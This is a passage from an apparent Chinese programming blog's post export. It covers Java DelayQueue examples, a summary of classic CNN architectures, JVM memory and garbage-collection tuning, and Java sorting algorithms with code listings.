PriorityQueueDelayQueue的关键元素BlockingQueue、PriorityQueue、Delayed。可以这么说，DelayQueue是一个使用优先队列（PriorityQueue）实现的BlockingQueue，优先队列的比较基准值是时间。通过PriorityQueue，可以优先处理最紧急的元素，利用BlockingQueue，能防止不必要的不断轮询，提高了性能。在很多需要回收对象的场景都能用上。 代码示例场景一模拟一个考试的日子，考试时间为120分钟，30分钟后才可交卷，当时间到了，或学生都交完卷了考试结束。主要注意的：1、考试时间为120分钟，30分钟后才可交卷，初始化考生完成试卷时间最小应为30分钟2、对于能够在120分钟内交卷的考生，如何实现这些考生交卷3、对于120分钟内没有完成考试的考生，在120分钟考试时间到后需要让他们强制交卷4、在所有的考生都交完卷后，需要将控制线程关闭 下面是自己修改了的代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171package com.bbk.demo;import java.util.Iterator;import java.util.Random;import java.util.concurrent.CountDownLatch;import java.util.concurrent.DelayQueue;import java.util.concurrent.Delayed;import java.util.concurrent.TimeUnit;/** * DelayQueue * @author wasim * @project Demo * @create at 2015-10-6 下午4:37:31 */public class Exam { public static void main(String[] args) throws InterruptedException { int studentNumber = 20; CountDownLatch countDownLatch = new CountDownLatch(studentNumber+1); DelayQueue&lt; Student&gt; students = new DelayQueue&lt;Student&gt;(); Random random = new Random(); for (int i = 0; i &lt; studentNumber; i++) { students.put(new Student(&quot;student&quot;+(i+1), 30+random.nextInt(120),countDownLatch)); } Thread teacherThread =new Thread(new Teacher(students)); students.put(new EndExam(students, 120,countDownLatch,teacherThread)); teacherThread.start(); countDownLatch.await(); System.out.println(&quot; 考试时间到，全部交卷！&quot;); }}class Student implements Runnable,Delayed{ private String name; private long workTime; private long submitTime; private boolean isForce = false; private CountDownLatch countDownLatch; public Student(){} public Student(String name,long workTime,CountDownLatch countDownLatch){ this.name = name; this.workTime = workTime; //提交时间 = 当前时间 + 作答时间 this.submitTime = TimeUnit.NANOSECONDS.convert(workTime, TimeUnit.NANOSECONDS)+System.nanoTime(); this.countDownLatch = countDownLatch; } @Override public int compareTo(Delayed o) { // 按照作答时长正序排序（队头放的是你认为最先需要处理的元素，在这里体现为需要最先交卷，所以是正序） if(o == null || ! (o instanceof Student)) return 1; if(o == this) return 0; Student s = (Student)o; if (this.workTime &gt; s.workTime) { return 1; }else if (this.workTime == s.workTime) { return 0; }else { return -1; } } @Override public long getDelay(TimeUnit unit) { // 提交时间 - 当前时间 用来判断延迟是否到期（即是否可以提交试卷，可以进行take或者poll） // 返回正数：延迟还有多少时间到期。负数：延迟已经在多长时间前到期。负数代表可以take或者poll return unit.convert(submitTime - System.nanoTime(), TimeUnit.NANOSECONDS); } @Override public void run() { if (isForce) { System.out.println(name + &quot; 交卷, 希望用时&quot; + workTime + &quot;分钟&quot;+&quot; ,实际用时 120分钟&quot; ); }else { System.out.println(name + &quot; 交卷, 希望用时&quot; + workTime + &quot;分钟&quot;+&quot; ,实际用时 &quot;+workTime +&quot; 分钟&quot;); } countDownLatch.countDown(); } public boolean isForce() { return isForce; } public void setForce(boolean isForce) { this.isForce = isForce; } public String getName() { return name; } public void setName(String name) { this.name = name; } public long getWorkTime() { return workTime; } public void setWorkTime(long workTime) { this.workTime = workTime; } public long getSubmitTime() { return submitTime; } public void setSubmitTime(long submitTime) { this.submitTime = submitTime; } }class EndExam extends Student{ private DelayQueue&lt;Student&gt; students; private CountDownLatch countDownLatch; private Thread teacherThread; public EndExam(DelayQueue&lt;Student&gt; students, long workTime, CountDownLatch countDownLatch,Thread teacherThread) { super(&quot;强制收卷&quot;, workTime,countDownLatch); this.students = students; this.countDownLatch = countDownLatch; this.teacherThread = teacherThread; } @Override public void run() { teacherThread.interrupt(); Student tmpStudent; for (Iterator&lt;Student&gt; iterator2 = students.iterator(); iterator2.hasNext();) { tmpStudent = iterator2.next(); tmpStudent.setForce(true); System.out.println(tmpStudent.getName()+&quot;===&quot;+tmpStudent.getDelay(TimeUnit.NANOSECONDS)); tmpStudent.run(); } countDownLatch.countDown(); } }class Teacher implements Runnable{ private DelayQueue&lt;Student&gt; students; public Teacher(DelayQueue&lt;Student&gt; students){ this.students = students; } @Override public void run() { try { System.out.println(&quot; test start&quot;); while(!Thread.interrupted()){ Student s = students.take(); System.out.println(s.getName()+&quot;===&quot;+s.getDelay(TimeUnit.NANOSECONDS)); s.run(); } } catch (Exception e) { e.printStackTrace(); } } } 场景二向缓存添加内容时，给每一个key设定过期时间，系统自动将超过过期时间的key清除。需要注意的是：1、当向缓存中添加key-value对时，如果这个key在缓存中存在并且还没有过期，需要用这个key对应的新过期时间2、为了能够让DelayQueue将其已保存的key删除，需要重写实现Delayed接口添加到DelayQueue的DelayedItem的hashCode函数和equals函数3、当缓存关闭，监控程序也应关闭，因而监控线程应当用守护线程 网上搜到的相关代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132/** *Cache.java * * Created on 2014-1-11 上午11:30:36 by sunzhenchao mychaoyue2011@163.com */public class Cache&lt;K, V&gt; { public ConcurrentHashMap&lt;K, V&gt; map = new ConcurrentHashMap&lt;K, V&gt;(); public DelayQueue&lt;DelayedItem&lt;K&gt;&gt; queue = new DelayQueue&lt;DelayedItem&lt;K&gt;&gt;(); public void put(K k,V v,long liveTime){ V v2 = map.put(k, v); DelayedItem&lt;K&gt; tmpItem = new DelayedItem&lt;K&gt;(k, liveTime); if (v2 != null) { queue.remove(tmpItem); } queue.put(tmpItem); } public Cache(){ Thread t = new Thread(){ @Override public void run(){ dameonCheckOverdueKey(); } }; t.setDaemon(true); t.start(); } public void dameonCheckOverdueKey(){ while (true) { DelayedItem&lt;K&gt; delayedItem = queue.poll(); if (delayedItem != null) { map.remove(delayedItem.getT()); System.out.println(System.nanoTime()+&quot; remove &quot;+delayedItem.getT() +&quot; from cache&quot;); } try { Thread.sleep(300); } catch (Exception e) { // TODO: handle exception } } } /** * TODO * @param args * 2014-1-11 上午11:30:36 * @author:孙振超 * @throws InterruptedException */ public static void main(String[] args) throws InterruptedException { Random random = new Random(); int cacheNumber = 10; int liveTime = 0; Cache&lt;String, Integer&gt; cache = new Cache&lt;String, Integer&gt;(); for (int i = 0; i &lt; cacheNumber; i++) { liveTime = random.nextInt(3000); System.out.println(i+&quot; &quot;+liveTime); cache.put(i+&quot;&quot;, i, random.nextInt(liveTime)); if (random.nextInt(cacheNumber) &gt; 7) { liveTime = random.nextInt(3000); System.out.println(i+&quot; &quot;+liveTime); cache.put(i+&quot;&quot;, i, random.nextInt(liveTime)); } } Thread.sleep(3000); System.out.println(); }}class DelayedItem&lt;T&gt; implements Delayed{ private T t; private long liveTime ; private long removeTime; public DelayedItem(T t,long liveTime){ this.setT(t); this.liveTime = liveTime; this.removeTime = TimeUnit.NANOSECONDS.convert(liveTime, TimeUnit.NANOSECONDS) + System.nanoTime(); } @Override public int compareTo(Delayed o) { if (o == null) return 1; if (o == this) return 0; if (o instanceof DelayedItem){ DelayedItem&lt;T&gt; tmpDelayedItem = (DelayedItem&lt;T&gt;)o; if (liveTime &gt; tmpDelayedItem.liveTime ) { return 1; }else if (liveTime == tmpDelayedItem.liveTime) { return 0; }else { return -1; } } long diff = getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS); return diff &gt; 0 ? 1:diff == 0? 0:-1; } @Override public long getDelay(TimeUnit unit) { return unit.convert(removeTime - System.nanoTime(), unit); } public T getT() { return t; } public void setT(T t) { this.t = t; } @Override public int hashCode(){ return t.hashCode(); } @Override public boolean equals(Object object){ if (object instanceof DelayedItem) { return object.hashCode() == hashCode() ?true:false; } return false; } }","link":"/2016/04/16/DelayQueue%E4%BD%BF%E7%94%A8/"},{"title":"CNN经典网络总结","text":"LeNet-5LeNet诞生于1998年，网络结构比较完整，包括卷积层、pooling层、全连接层，这些都是现代CNN网络的基本组件，被认为是CNN的开端。 网络特点： LeNet-5 针对灰度图像而训练，因此输入图片的通道数为 1。 该模型总共包含了约 6 万个参数，远少于标准神经网络所需。 典型的 LeNet-5 结构包含卷积层（CONV layer），池化层（POOL layer）和全连接层（FC layer），排列顺序一般为 【CONV layer-&gt;POOL layer-&gt;CONV layer-&gt;POOL layer-&gt;FC layer-&gt;FC layer-&gt;OUTPUT layer】。一个或多个卷积层后面跟着一个池化层的模式至今仍十分常用。在计算神经网络的层数时，通常只统计具有权重和参数的层，池化层没有需要训练的参数，所以和之前的卷积层共同计为一层。 当 LeNet-5模型被提出时，其池化层使用的是平均池化，而且各层激活函数一般选用 Sigmoid 和 tanh。现在，我们可以根据需要，做出改进，使用最大池化并选用 ReLU 作为激活函数。 相关论文：LeCun et.al., 1998. Gradient-based learning applied to document recognition。吴恩达老师建议精读第二段，泛读第三段。 AlexNet-8 AlexNet-8有5个卷积层和3个全连接层，它与 LeNet-5 模型类似，但是更复杂，包含约 6000 万参数。当用于训练图像和数据集时，AlexNet 能够处理非常相似的基本构造模块，这些模块往往包含大量的隐藏单元或数据。 相对于1998年的LeNet，2012年才出现的AlexNet有了历史性的突破，相对LeNet做了如下改进：（1）数据不够的情况下，采用了数据增强（2）用ReLU代替了传统的Tanh或者Logistic。（3）引入Dropout，防止过拟合，是AlexNet中一个很大的创新。（4）Local Response Normalization，局部响应归一化，简称LRN，实际就是利用临近的数据做归一化。这个策略贡献了1.2%的Top-5错误率。（5）多GPU训练。如图 AlexNet-2 所示，训练分布在两个GPU上，这是比一臂之力还大的洪荒之力。（6）Overlapping Pooling，Overlapping的意思是有重叠，即Pooling的步长比Pooling Kernel的对应边要小。这个策略贡献了0.3%的Top-5错误率。 相关论文：Krizhevsky et al.,2012. ImageNet classification with deep convolutional neural networks。这是一篇易于理解并且影响巨大的论文，计算机视觉群体自此开始重视深度学习。 VGG-16 特点： VGG 使用最广泛的网络为 VGG-16 网络。 超参数较少，只需要专注于构建卷积层。 结构不复杂且规整，在每一组卷积层进行滤波器翻倍操作。 VGG 需要训练的特征数量巨大，包含多达约 1.38 亿个参数。 相关论文：Simonvan &amp; Zisserman 2015. Very deep convolutional networks for large-scale image recognition。 1x1 卷积1x1 卷积（1x1 convolution，或称为 Network in Network）指滤波器的尺寸为 1。当通道数为 1 时，1x1 卷积意味着卷积操作等同于乘积操作。 而当通道数更多时，1x1 卷积的作用实际上类似全连接的神经网络结构，从而降低（或升高，取决于滤波器组数）数据的维度。 池化能压缩数据的高度 $n_H$ 及宽度 $n_W$，而 1×1 卷积能压缩数据的通道数 $n_C$。在如下图所示的例子中，用 32 个大小为 1×1×192 的滤波器进行卷积，就能使原先数据包含的 192 个通道压缩为 32 个。 虽然论文 Lin et al., 2013. Network in network 中关于架构的详细内容并没有得到广泛应用，但是 1x1 卷积的理念十分有影响力，许多神经网络架构（包括 Inception 网络）都受到它的影响。 GoogleLeNet-22 Inception 网络2012年AlexNet做出历史突破以来，直到GoogLeNet出来之前，主流的网络结构突破大致是网络更深（层数），网络更宽（神经元数）。所以大家调侃深度学习为“深度调参”，但是纯粹的增大网络有如下缺点： 参数太多，容易过拟合，若训练数据集有限； 网络越大计算复杂度越大，难以应用； 网络越深，梯度越往后穿越容易消失（梯度弥散），难以优化模型 那么如何增加网络深度和宽度的同时减少参数？Inception在这样的情况下应运而生。 在之前的卷积网络中，我们只能选择单一尺寸和类型的滤波器。而 Inception 网络的作用 是代替人工来确定卷积层中的滤波器尺寸与类型，或者确定是否需要创建卷积层或池化层。 如图，Inception 网络选用不同尺寸的滤波器进行 Same 卷积，并将卷积和池化得到的输出组合拼接起来，最终让网络自己去学习需要的参数和采用的滤波器组合。 相关论文：Szegedy et al., 2014, Going Deeper with Convolutions 计算成本问题在提升性能的同时，Inception 网络有着较大的计算成本。下图是一个例子： 图中有 32 个滤波器，每个滤波器的大小为 5x5x192。输出大小为 28x28x32，所以需要计算 28x28x32 个数字，对于每个数，都要执行 5x5x192 次乘法运算。加法运算次数与乘法运算次数近似相等。因此，可以看作这一层的计算量为 28x28x32x5x5x192 = 1.2亿。 为了解决计算量大的问题，可以引入 1x1 卷积来减少其计算量。 对于同一个例子，我们使用 1x1 卷积把输入数据从 192 个通道减少到 16 个通道，然后对这个较小层运行 5x5 卷积，得到最终输出。这个 1x1 的卷积层通常被称作瓶颈层（Bottleneck layer）。 改进后的计算量为 28x28x192x16 + 28x28x32x5x5x15 = 1.24 千万，减少了约 90%。 只要合理构建瓶颈层，就可以既显著缩小计算规模，又不会降低网络性能。 完整的 Inception 网络 上图是引入 1x1 卷积后的 Inception 模块。值得注意的是，为了将所有的输出组合起来，红色的池化层使用 Same 类型的填充（padding）来池化使得输出的宽高不变，通道数也不变。 多个 Inception 模块组成一个完整的 Inception 网络（被称为 GoogLeNet，以向 LeNet 致敬），如下图所示： 注意黑色椭圆圈出的隐藏层，这些分支都是 Softmax 的输出层，可以用来参与特征的计算及结果预测，起到调整并防止发生过拟合的效果。 经过研究者们的不断发展，Inception 模型的 V2、V3、V4 以及引入残差网络的版本被提出，这些变体都基于 Inception V1 版本的基础思想上。顺便一提，Inception 模型的名字来自电影《盗梦空间》。 ResNet-152 残差网络因为存在梯度消失和梯度爆炸问题，网络越深，就越难以训练成功。**残差网络**（Residual Networks，简称为 ResNets）可以有效解决这个问题。 上图的结构被称为残差块（Residual block）。通过捷径（Short cut，或者称跳远连接，Skip connections）可以将 a[l]添加到第二个 ReLU 过程中，直接建立 a[l]与 a[l+2]之间的隔层联系。表达式如下： z^{[l+1]} = W^{[l+1]}a^{[l]} + b^{[l+1]}a^{[l+1]} = g(z^{[l+1]})z^{[l+2]} = W^{[l+2]}a^{[l+1]} + b^{[l+2]}a^{[l+2]} = g(z^{[l+2]} + a^{[l]})构建一个残差网络就是将许多残差块堆积在一起，形成一个深度网络。 为了便于区分，在 ResNets 的论文 He et al., 2015. Deep residual networks for image recognition中，非残差网络被称为普通网络（Plain Network）。将它变为残差网络的方法是加上所有的跳远连接。 在理论上，随着网络深度的增加，性能应该越来越好。但实际上，对于一个普通网络，随着神经网络层数增加，训练错误会先减少，然后开始增多。但残差网络的训练效果显示，即使网络再深，其在训练集上的表现也会越来越好。 残差网络有助于解决梯度消失和梯度爆炸问题，使得在训练更深的网络的同时，又能保证良好的性能。 残差网络有效的原因假设有一个大型神经网络，其输入为 $X$，输出为 $a^{[l]}$。给这个神经网络额外增加两层，输出为 $a^{[l+2]}$。将这两层看作一个具有跳远连接的残差块。为了方便说明，假设整个网络中都选用 ReLU 作为激活函数，因此输出的所有激活值都大于等于 0。 则有： \\begin{equation} \\begin{split} a^{[l+2]} &= g(z^{[l+2]}+a^{[l]}) \\\\ &= g(W^{[l+2]}a^{[l+1]}+b^{[l+2]}+a^{[l]}) \\end{split} \\end{equation}当发生梯度消失时，$W^{[l+2]}\\approx0$，$b^{[l+2]}\\approx0$，则有： a^{[l+2]} = g(a^{[l]}) = ReLU(a^{[l]}) = a^{[l]}因此，这两层额外的残差块不会降低网络性能。而如果没有发生梯度消失时，训练得到的非线性关系会使得表现效果进一步提高。 注意，如果 $a^{[l]}$与 $a^{[l+2]}$ 的维度不同，需要引入矩阵 $W_s$ 与 $a^{[l]}$ 相乘，使得二者的维度相匹配。参数矩阵 $W_s$既可以通过模型训练得到，也可以作为固定值，仅使 $a^{[l]}$ 截断或者补零。 上图是论文提供的 CNN 中 ResNet 的一个典型结构。卷积层通常使用 Same 卷积以保持维度相同，而不同类型层之间的连接（例如卷积层和池化层），如果维度不同，则需要引入矩阵 $W_s$。 经典网络对比","link":"/2018/01/15/CNN%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93/"},{"title":"JVM性能调优","text":"最近因项目存在内存泄漏，故进行大规模的JVM性能调优，现把相关知识进行归纳总结 一、JVM内存模型及垃圾收集算法1.内存模型根据Java虚拟机规范，JVM将内存划分为： 年轻代（New）：年轻代用来存放JVM刚分配的Java对象 年老代（Tenured)：年轻代中经过垃圾回收没有回收掉的对象将被Copy到年老代 永久代（Perm）：永久代存放Class、Method元信息，其大小跟项目的规模、类、方法的量有关，一般设置为128M就足够，设置原则是预留30%的空间。 其中New和Tenured属于堆内存，堆内存会从JVM启动参数（-Xmx:3G）指定的内存中分配。Perm不属于堆内存，有虚拟机直接分配，但可以通过-XX:PermSize -XX:MaxPermSize 等参数调整其大小。 New又分为几个部分： Eden：Eden用来存放JVM刚分配的对象 Survivor1 Survivro2：两个Survivor空间一样大，当Eden中的对象经过垃圾回收没有被回收掉时，会在两个Survivor之间来回Copy，当满足某个条件，比如Copy次数，就会被Copy到Tenured。显然，Survivor只是增加了对象在年轻代中的逗留时间，增加了被垃圾回收的可能性。 2.垃圾回收算法垃圾回收算法可以分为三类，都基于标记-清除（复制）算法： Serial算法（单线程） 并行算法 并发算法 JVM会根据机器的硬件配置对每个内存代选择适合的回收算法，比如，如果机器多于1个核，会对年轻代选择并行算法，关于选择细节请参考JVM调优文档。 稍微解释下的是，并行算法是用多线程进行垃圾回收，回收期间会暂停程序的执行，而并发算法，也是多线程回收，但期间不停止应用执行。所以，并发算法适用于交互性高的一些程序。经过观察，并发算法会减少年轻代的大小，其实就是使用了一个大的年老代，这反过来跟并行算法相比吞吐量相对较低。 还有一个问题是，垃圾回收动作何时执行？Full GC影响较大，应尽可能不进行Full GC 当年轻代内存满时，会引发一次普通GC，该GC仅回收年轻代。需要强调的时，年轻代满是指Eden代满，Survivor满不会引发GC 当年老代满时会引发Full GC，Full GC将会同时回收年轻代、年老代 当永久代满时也会引发Full GC，会导致Class、Method元信息的卸载 另一个问题是，何时会抛出OutOfMemoryException，并不是内存被耗空的时候才抛出 JVM98%的时间都花费在内存回收 每次回收的内存小于2% 满足这两个条件将触发OutOfMemoryException，这将会留给系统一个微小的间隙以做一些Down之前的操作，比如手动打印Heap Dump。 二、内存泄漏及解决方法1.系统崩溃前的一些现象： 每次垃圾回收的时间越来越长，由之前的10ms延长到50ms左右，FullGC的时间也有之前的0.5s延长到4、5s FullGC的次数越来越多，最频繁时隔不到1分钟就进行一次FullGC 年老代的内存越来越大并且每次FullGC后年老代没有内存被释放之后系统会无法响应新的请求，逐渐到达OutOfMemoryError的临界值。 2.生成堆的dump文件 通过JMX的MBean生成当前的Heap信息，大小为一个3G（整个堆的大小）的hprof文件，如果没有启动JMX可以通过Java的jmap命令来生成该文件。 3.分析dump文件下面要考虑的是如何打开这个3G的堆信息文件，显然一般的Window系统没有这么大的内存，必须借助高配置的Linux。当然我们可以借助X-Window把Linux上的图形导入到Window。我们考虑用下面几种工具打开该文件： Visual VM IBM HeapAnalyzer JDK 自带的Hprof工具 使用这些工具时为了确保加载速度，建议设置最大内存为6G。使用后发现，这些工具都无法直观地观察到内存泄漏，Visual VM虽能观察到对象大小，但看不到调用堆栈；HeapAnalyzer虽然能看到调用堆栈，却无法正确打开一个3G的文件。因此，我们又选用了Eclipse专门的静态内存分析工具Mat 4.分析内存泄漏通过Mat我们能清楚地看到，哪些对象被怀疑为内存泄漏，哪些对象占的空间最大及对象的调用关系。针对本案，在ThreadLocal中有很多的JbpmContext实例，经过调查是JBPM的Context没有关闭所致 另外，通过Mat或JMX我们还可以分析线程状态，可以观察到线程被阻塞在哪个对象上，从而判断系统的瓶颈。 5.回归问题 Q：为什么崩溃前垃圾回收的时间越来越长？A:根据内存模型和垃圾回收算法，垃圾回收分两部分：内存标记、清除（复制），标记部分只要内存大小固定时间是不变的，变的是复制部分，因为每次垃圾回收都有一些回收不掉的内存，所以增加了复制量，导致时间延长。所以，垃圾回收的时间也可以作为判断内存泄漏的依据Q：为什么Full GC的次数越来越多？A：因此内存的积累，逐渐耗尽了年老代的内存，导致新对象分配没有更多的空间，从而导致频繁的垃圾回收Q:为什么年老代占用的内存越来越大？A:因为年轻代的内存无法被回收，越来越多地被Copy到年老代 三、性能调优除了上述内存泄漏外，我们还发现CPU长期不足3%，系统吞吐量不够，针对8core×16G、64bit的Linux服务器来说，是严重的资源浪费。在CPU负载不足的同时，偶尔会有用户反映请求的时间过长，我们意识到必须对程序及JVM进行调优。从以下几个方面进行： 线程池：解决用户响应时间长的问题 连接池 JVM启动参数：调整各代的内存比例和垃圾回收算法，提高吞吐量 程序算法：改进程序逻辑算法提高性能、 1.Java线程池（java.util.concurrent.ThreadPoolExecutor）大多数JVM6上的应用采用的线程池都是JDK自带的线程池，之所以把成熟的Java线程池进行罗嗦说明，是因为该线程池的行为与我们想象的有点出入。Java线程池有几个重要的配置参数： corePoolSize：核心线程数（最新线程数） maximumPoolSize：最大线程数，超过这个数量的任务会被拒绝，用户可以通过RejectedExecutionHandler接口自定义处理方式 keepAliveTime：线程保持活动的时间 workQueue：工作队列，存放执行的任务 Java线程池需要传入一个Queue参数（workQueue）用来存放执行的任务，而对Queue的不同选择，线程池有完全不同的行为： SynchronousQueue： 一个无容量的等待队列，一个线程的insert操作必须等待另一线程的remove操作，采用这个Queue线程池将会为每个任务分配一个新线程 LinkedBlockingQueue ： 无界队列，采用该Queue，线程池将忽略 maximumPoolSize参数，仅用corePoolSize的线程处理所有的任务，未处理的任务便在LinkedBlockingQueue中排队 ArrayBlockingQueue： 有界队列，在有界队列和 maximumPoolSize的作用下，程序将很难被调优：更大的Queue和小的maximumPoolSize将导致CPU的低负载；小的Queue和大的池，Queue就没起动应有的作用。 其实我们的要求很简单，希望线程池能跟连接池一样，能设置最小线程数、最大线程数，当最小数&lt;任务&lt;最大数时，应该分配新的线程处理；当任务&gt;最大数时，应该等待有空闲线程再处理该任务。 但线程池的设计思路是，任务应该放到Queue中，当Queue放不下时再考虑用新线程处理，如果Queue满且无法派生新线程，就拒绝该任务。设计导致“先放等执行”、“放不下再执行”、“拒绝不等待”。所以，根据不同的Queue参数，要提高吞吐量不能一味地增大maximumPoolSize。 当然，要达到我们的目标，必须对线程池进行一定的封装，幸运的是ThreadPoolExecutor中留了足够的自定义接口以帮助我们达到目标。我们封装的方式是： 以SynchronousQueue作为参数，使maximumPoolSize发挥作用，以防止线程被无限制的分配，同时可以通过提高maximumPoolSize来提高系统吞吐量 自定义一个RejectedExecutionHandler，当线程数超过maximumPoolSize时进行处理，处理方式为隔一段时间检查线程池是否可以执行新Task，如果可以把拒绝的Task重新放入到线程池，检查的时间依赖keepAliveTime的大小。 2.连接池（org.apache.commons.dbcp.BasicDataSource）在使用org.apache.commons.dbcp.BasicDataSource的时候，因为之前采用了默认配置，所以当访问量大时，通过JMX观察到很多Tomcat线程都阻塞在BasicDataSource使用的Apache ObjectPool的锁上，直接原因当时是因为BasicDataSource连接池的最大连接数设置的太小，默认的BasicDataSource配置，仅使用8个最大连接。 我还观察到一个问题，当较长的时间不访问系统，比如2天，DB上的Mysql会断掉所以的连接，导致连接池中缓存的连接不能用。为了解决这些问题，我们充分研究了BasicDataSource，发现了一些优化的点： Mysql默认支持100个链接，所以每个连接池的配置要根据集群中的机器数进行，如有2台服务器，可每个设置为60 initialSize：参数是一直打开的连接数 minEvictableIdleTimeMillis：该参数设置每个连接的空闲时间，超过这个时间连接将被关闭 timeBetweenEvictionRunsMillis：后台线程的运行周期，用来检测过期连接 maxActive：最大能分配的连接数 maxIdle：最大空闲数，当连接使用完毕后发现连接数大于maxIdle，连接将被直接关闭。只有initialSize &lt; x &lt; maxIdle的连接将被定期检测是否超期。这个参数主要用来在峰值访问时提高吞吐量。 initialSize是如何保持的？经过研究代码发现，BasicDataSource会关闭所有超期的连接，然后再打开initialSize数量的连接，这个特性与minEvictableIdleTimeMillis、timeBetweenEvictionRunsMillis一起保证了所有超期的initialSize连接都会被重新连接，从而避免了Mysql长时间无动作会断掉连接的问题。 3.JVM参数在JVM启动参数中，可以设置跟内存、垃圾回收相关的一些参数设置，默认情况不做任何设置JVM会工作的很好，但对一些配置很好的Server和具体的应用必须仔细调优才能获得最佳性能。通过设置我们希望达到一些目标： GC的时间足够的小 GC的次数足够的少 发生Full GC的周期足够的长 前两个目前是相悖的，要想GC时间小必须要一个更小的堆，要保证GC次数足够少，必须保证一个更大的堆，我们只能取其平衡。 针对JVM堆的设置一般，可以通过-Xms -Xmx限定其最小、最大值，为了防止垃圾收集器在最小、最大之间收缩堆而产生额外的时间，我们通常把最大、最小设置为相同的值 年轻代和年老代将根据默认的比例（1：2）分配堆内存，可以通过调整二者之间的比率NewRadio来调整二者之间的大小，也可以针对回收代，比如年轻代，通过 -XX:newSize -XX:MaxNewSize来设置其绝对大小。同样，为了防止年轻代的堆收缩，我们通常会把-XX:newSize -XX:MaxNewSize设置为同样大小 年轻代和年老代设置多大才算合理？这个我问题毫无疑问是没有答案的，否则也就不会有调优。我们观察一下二者大小变化有哪些影响：（1）更大的年轻代必然导致更小的年老代，大的年轻代会延长普通GC的周期，但会增加每次GC的时间；小的年老代会导致更频繁的Full GC。（2）更小的年轻代必然导致更大年老代，小的年轻代会导致普通GC很频繁，但每次的GC时间会更短；大的年老代会减少Full GC的频率。（3）如何选择应该依赖应用程序对象生命周期的分布情况：如果应用存在大量的临时对象，应该选择更大的年轻代；如果存在相对较多的持久对象，年老代应该适当增大。但很多应用都没有这样明显的特性，在抉择时应该根据以下两点：（A）本着Full GC尽量少的原则，让年老代尽量缓存常用对象，JVM的默认比例1：2也是这个道理（B）通过观察应用一段时间，看其他在峰值时年老代会占多少内存，在不影响Full GC的前提下，根据实际情况加大年轻代，比如可以把比例控制在1：1。但应该给年老代至少预留1/3的增长空间 在配置较好的机器上（比如多核、大内存），可以为年老代选择并行收集算法： -XX:+UseParallelOldGC ，默认为Serial收集 线程堆栈的设置：每个线程默认会开启1M的堆栈，用于存放栈帧、调用参数、局部变量等，对大多数应用而言这个默认值太了，一般256K就足用。理论上，在内存不变的情况下，减少每个线程的堆栈，可以产生更多的线程，但这实际上还受限于操作系统。 可以通过下面的参数打Heap Dump信息（1）-XX:HeapDumpPath（2）-XX:+PrintGCDetails（3）-XX:+PrintGCTimeStamps（4）-Xloggc:/usr/aaa/dump/heap_trace.txt 通过下面参数可以控制OutOfMemoryError时打印堆的信息-XX:+HeapDumpOnOutOfMemoryError 请看一下一个时间的Java参数配置：（服务器：Linux 64Bit，8Core×16G） JAVA_OPTS=”$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G” 经过观察该配置非常稳定，每次普通GC的时间在10ms左右，Full GC基本不发生，或隔很长很长的时间才发生一次 通过分析dump文件可以发现，每个1小时都会发生一次Full GC，经过多方求证，只要在JVM中开启了JMX服务，JMX将会1小时执行一次Full GC以清除引用，关于这点请参考附件文档。 4.程序算法调优：本次不作为重点","link":"/2016/04/20/JVM%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/"},{"title":"Java常用算法","text":"常见排序之间的关系: 1、直接插入排序（1）基本思想：在要排序的一组数中，假设前面(n-1)[n&gt;=2] 个数已经是排好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数也是排好顺序的。如此反复循环，直到全部排好顺序。（2）实例（3）用java实现123456789101112131415161718 package com.njue; public class insertSort { public insertSort(){ inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; int temp=0; for(int i=1;i&lt;a.length;i++){ int j=i-1; temp=a[i]; for(;j&gt;=0&amp;&amp;temp&lt;a[j];j--){ a[j+1]=a[j]; //将大于temp的值整体后移一个单位 } a[j+1]=temp; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 2、希尔排序（最小增量排序）（1）基本思想：算法先将要排序的一组数按某个增量d（n/2,n为要排序数的个数）分成若干组，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。当增量减到1时，进行直接插入排序后，排序完成。（2）实例：（3）用java实现12345678910111213141516171819202122232425public class shellSort { public shellSort(){ int a[]={1,54,6,3,78,34,12,45,56,100}; double d1=a.length; int temp=0; while(true){ d1= Math.ceil(d1/2); int d=(int) d1; for(int x=0;x&lt;d;x++){ for(int i=x+d;i&lt;a.length;i+=d){ int j=i-d; temp=a[i]; for(;j&gt;=0&amp;&amp;temp&lt;a[j];j-=d){ a[j+d]=a[j]; } a[j+d]=temp; } } if(d==1) break; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 3、简单选择排序（1）基本思想：在要排序的一组数中，选出最小的一个数与第一个位置的数交换；然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。（2）实例：（3）用java实现12345678910111213141516171819202122public class selectSort { public selectSort(){ int a[]={1,54,6,3,78,34,12,45}; int position=0; for(int i=0;i&lt;a.length;i++){ int j=i+1; position=i; int temp=a[i]; for(;j&lt;a.length;j++){ if(a[j]&lt;temp){ temp=a[j]; position=j; } } a[position]=a[i]; a[i]=temp; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 4、堆排序（1）基本思想：堆排序是一种树形选择排序，是对直接选择排序的有效改进。堆的定义如下：具有n个元素的序列（h1,h2,…,hn),当且仅当满足（hi&gt;=h2i,hi&gt;=2i+1）或（hi&lt;=h2i,hi&lt;=2i+1） 